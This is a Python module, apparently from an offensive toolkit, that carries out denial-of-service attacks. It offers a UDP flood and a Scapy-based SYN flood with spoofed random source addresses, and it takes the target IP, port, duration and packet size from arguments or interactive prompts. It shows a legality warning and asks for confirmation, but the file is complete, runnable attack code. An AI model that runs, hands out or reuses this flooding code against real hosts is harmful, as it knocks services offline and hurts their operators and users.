# modules/dosattack.py

import argparse
import os
import random
import socket
import sys
import threading
import time
from scapy.all import IP, TCP, Raw, send

def udp_flood(target_ip, target_port, duration, packet_size):
    """
    Performs a UDP flood attack on the target with a user-defined packet size.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = os.urandom(packet_size)
    timeout = time.time() + duration
    sent_packets = 0

    print(f"[*] Starting UDP flood on {target_ip}:{target_port} for {duration} seconds with packet size {packet_size} bytes.")
    try:
        while time.time() < timeout:
            client.sendto(bytes_to_send, (target_ip, target_port))
            sent_packets += 1
            sys.stdout.write(f"\r[*] Packets sent: {sent_packets}")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[*] Attack stopped by user.")
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
    finally:
        print(f"\n[*] UDP flood finished. Total packets sent: {sent_packets}")

def syn_flood(target_ip, target_port, duration, packet_size):
    """
    Performs a SYN flood attack on the target using Scapy with an optional payload size.
    """
    if 'scapy' not in sys.modules:
        print("[!] Cannot perform SYN flood, Scapy is not loaded.")
        return

    timeout = time.time() + duration
    sent_packets = 0

    print(f"[*] Starting SYN flood on {target_ip}:{target_port} for {duration} seconds with packet size {packet_size} bytes.")
    try:
        while time.time() < timeout:
            spoofed_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            ip_layer = IP(src=spoofed_ip, dst=target_ip)
            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            # Add a payload of the specified size
            payload = Raw(os.urandom(packet_size))
            packet = ip_layer / tcp_layer / payload
            send(packet, verbose=False)
            sent_packets += 1
            sys.stdout.write(f"\r[*] Packets sent: {sent_packets}")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[*] Attack stopped by user.")
    except Exception as e:
        print(f"\n[!] An error occurred: {e}. Make sure you are running this with sufficient privileges.")
    finally:
        print(f"\n[*] SYN flood finished. Total packets sent: {sent_packets}")

def get_args_interactive():
    """Gets attack parameters from the user interactively."""
    print("[*] No command-line arguments detected. Entering interactive mode.")
    target_ip = input("Enter the target IP address: ")
    
    while True:
        try:
            target_port = int(input("Enter the target port: "))
            break
        except ValueError:
            print("[!] Invalid port. Please enter a number.")

    while True:
        attack_type = input("Enter the attack type (udp/syn): ").lower()
        if attack_type in ["udp", "syn"]:
            break
        else:
            print("[!] Invalid attack type. Please choose 'udp' or 'syn'.")
            
    while True:
        try:
            duration = int(input("Enter the duration in seconds (default: 60): ") or "60")
            break
        except ValueError:
            print("[!] Invalid duration. Please enter a number.")
    
    while True:
        try:
            # New prompt for packet size
            packet_size = int(input("Enter the packet size in bytes (default: 1024): ") or "1024")
            if 0 < packet_size <= 65507: # UDP max payload size
                 break
            else:
                 print("[!] Invalid packet size. Please enter a number between 1 and 65507.")
        except ValueError:
            print("[!] Invalid size. Please enter a number.")
            
    # Create a simple object to hold the arguments
    class Args:
        pass
    args = Args()
    args.target_ip = target_ip
    args.target_port = target_port
    args.attack_type = attack_type
    args.duration = duration
    args.packet_size = packet_size # Store the packet size
    
    return args

def main():
    """
    Main function to parse arguments and initiate the DoS attack.
    """
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description="Denial of Service (DoS) Attack Module.")
        parser.add_argument("target_ip", help="The IP address of the target.")
        parser.add_argument("target_port", type=int, help="The port to attack.")
        parser.add_argument("attack_type", choices=["udp", "syn"], help="The type of DoS attack.")
        parser.add_argument("-d", "--duration", type=int, default=60, help="The duration of the attack in seconds.")
        # New argument for packet size
        parser.add_argument("-s", "--packet_size", type=int, default=1024, help="The size of each packet in bytes (default: 1024).")
        args = parser.parse_args()
    else:
        args = get_args_interactive()

    print("\n" + "="*60)
    print("  [!] WARNING: You are about to perform a Denial of Service attack.")
    print(f"  Target: {args.target_ip}:{args.target_port}")
    print(f"  Attack Type: {args.attack_type.upper()}")
    print(f"  Duration: {args.duration} seconds")
    # Display the chosen packet size
    print(f"  Packet Size: {args.packet_size} bytes")
    print("\n  This will flood the target with traffic and may render it unresponsive.")
    print("\n  This is illegal without explicit authorization.")
    print("\n  Only use this in a environment you are safe to preform it in")
    print("="*60)

    confirm = input("Are you sure you want to proceed? (Type 'yes' to confirm): ")
    if confirm.lower().strip() != 'yes':
        print("[*] Attack aborted by user.")
        sys.exit(0)

    # Pass the packet_size to the appropriate function
    if args.attack_type == "udp":
        udp_flood(args.target_ip, args.target_port, args.duration, args.packet_size)
    elif args.attack_type == "syn":
        syn_flood(args.target_ip, args.target_port, args.duration, args.packet_size)

if __name__ == "__main__":
    main()